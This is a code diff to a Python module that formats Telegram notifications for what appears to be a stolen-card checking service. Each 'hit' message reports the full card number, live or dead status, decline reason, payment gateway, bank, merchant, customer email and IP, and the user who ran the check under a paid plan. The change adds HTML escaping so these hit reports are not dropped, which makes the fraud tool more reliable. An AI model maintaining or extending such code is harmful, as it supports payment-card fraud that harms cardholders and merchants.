@@ -3,9 +3,19 @@ from __future__ import annotations
 
 from datetime import datetime, timezone
 from typing import Optional
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
 
+import html
 import json
+
+
+def _esc(v) -> str:
+    """HTML-escape any scraped/user-controlled value before it goes into a
+    Telegram parse_mode=HTML message. Unescaped '<', '&' or quotes cause a
+    400 and the WHOLE hit notification is silently dropped."""
+    if v is None:
+        return ""
+    return html.escape(str(v), quote=False)
 
 
 def clean_response(raw) -> str:
@@ -77,12 +87,16 @@ def _mask_success_url(url: Optional[str]) -> str:
         return "—"
     try:
         p = urlparse(url)
+        # Only linkify safe http(s) URLs; otherwise show escaped text.
+        if p.scheme not in ("http", "https") or not p.netloc:
+            return _esc(url)
         short = f"{p.netloc}{p.path}"
         if len(short) > 40:
             short = short[:37] + "..."
-        return f'<a href="{url}">{short}</a>'
+        safe_href = html.escape(quote(url, safe=":/?#[]@!$&'()*+,;=%~"), quote=True)
+        return f'<a href="{safe_href}">{_esc(short)}</a>'
     except Exception:
-        return url
+        return _esc(url)
 
 
 def _status_line(hit: dict) -> str:
@@ -99,11 +113,11 @@ def _status_line(hit: dict) -> str:
         return "🔐 OTP Required"
     if status in ("declined", "decline", "dead", "ccn_dead"):
         reason = hit.get("decline_reason") or hit.get("decline_code") or "declined"
-        return f"❌ Dead — {reason}"
+        return f"❌ Dead — {_esc(reason)}"
     if status == "error":
         err = hit.get("error_code") or "unknown"
-        return f"⚠️ Error — {err}"
-    return status.upper() or "?"
+        return f"⚠️ Error — {_esc(err)}"
+    return _esc(status.upper() or "?")
 
 
 def format_hit(hit: dict, user: dict, admin_view: bool = False) -> str:
@@ -158,33 +172,33 @@ def format_hit(hit: dict, user: dict, admin_view: bool = False) -> str:
     if admin_view:
         admin_header = (
             f"🔒 <b>ADMIN LOG</b>\n"
-            f"👤 User: <code>@{handle}</code> (id: <code>{user.get('telegram_id')}</code>)\n"
+            f"👤 User: <code>@{_esc(handle)}</code> (id: <code>{_esc(user.get('telegram_id'))}</code>)\n"
         )
         # v2.3.7: subtle marker so admin can spot hits from outdated builds
         # (paywall was in force but the user was on an older version). No
         # scary "TAMPERED" wording — just the version stamp.
         if hit.get("from_outdated_ext"):
             _ev = hit.get("ext_sent_version") or "unknown"
-            admin_header += f"📎 Ext version: <code>v{_ev}</code> (outdated)\n"
+            admin_header += f"📎 Ext version: <code>v{_esc(_ev)}</code> (outdated)\n"
         admin_header += "─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
 
     return (
         f"{admin_header}"
-        f"⚜️Card ➔ <code>{card_full}</code>\n"
+        f"⚜️Card ➔ <code>{_esc(card_full)}</code>\n"
         f"⚜️Status ➔ {status_line}\n"
-        f"⚜️Response ➔ <code>{response}</code>\n"
-        f"⚜️Gateway ➔ {gateway}\n"
+        f"⚜️Response ➔ <code>{_esc(response)}</code>\n"
+        f"⚜️Gateway ➔ {_esc(gateway)}\n"
         f"- - - - - - - - - - - - - - - - - - - - - -\n"
-        f"⚜️Bin ➔ <code>{bin_summary}</code>\n"
-        f"⚜️Bank ➔ {bin_bank}\n"
-        f"⚜️Country ➔ {country} {flag}\n"
+        f"⚜️Bin ➔ <code>{_esc(bin_summary)}</code>\n"
+        f"⚜️Bank ➔ {_esc(bin_bank)}\n"
+        f"⚜️Country ➔ {_esc(country)} {_esc(flag)}\n"
         f"- - - - - - - - - - - - - - - - - - - - - -\n"
-        f"⚜️Product ➔ {product}\n"
-        f"⚜️Merchant ➔ {merchant}\n"
+        f"⚜️Product ➔ {_esc(product)}\n"
+        f"⚜️Merchant ➔ {_esc(merchant)}\n"
         f"⚜️Success URL ➔ {success}\n"
-        f"⚜️Customer Email ➔ <code>{email}</code>\n"
-        f"⚜️IP ➔ <code>{ip_display}</code>\n"
+        f"⚜️Customer Email ➔ <code>{_esc(email)}</code>\n"
+        f"⚜️IP ➔ <code>{_esc(ip_display)}</code>\n"
         f"- - - - - - - - - - - - - - - - - - - - - -\n"
-        f"⚜️Checked by ➔ @{handle} ({plan})\n"
+        f"⚜️Checked by ➔ @{_esc(handle)} ({_esc(plan)})\n"
         f"⚜️Creator ➔ <b>𝙎𝙀𝙈𝙀𝙓</b>"
     )
